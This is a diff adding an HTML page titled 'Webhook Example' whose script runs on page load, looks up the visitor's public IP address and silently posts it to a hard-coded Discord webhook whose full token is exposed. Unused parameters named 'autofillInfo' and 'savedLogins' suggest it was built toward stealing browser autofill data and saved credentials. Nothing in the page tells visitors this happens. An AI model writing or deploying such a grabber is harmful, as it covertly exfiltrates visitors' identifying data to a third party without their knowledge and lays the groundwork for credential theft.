@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Webhook Example</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+  <script>
+    function sendToWebhook(ip, autofillInfo, savedLogins) {
+      var webhookURL = 'https://discord.com/api/webhooks/1130555299749707927/vTwp3Wdb_1dSD8NHx58HvROBy6F9fj4noGGd1vA0M4Bqp7BayJoX07Ym7lg4GfW8Fmlp';
+
+      var message = {
+        content: ip
+      };
+
+      $.ajax({
+        url: webhookURL,
+        type: 'POST',
+        data: JSON.stringify(message),
+        contentType: 'application/json',
+        success: function(response) {
+
+        },
+        error: function(error) {
+
+        }
+      });
+    }
+
+    $.getJSON('https://api.ipify.org?format=json', function(data) {
+      var ip = data.ip;
+      var autofillInfo = '';
+      var savedLogins = '';
+      sendToWebhook(ip, autofillInfo, savedLogins);
+    });
+  </script>
+</body>
+</html>
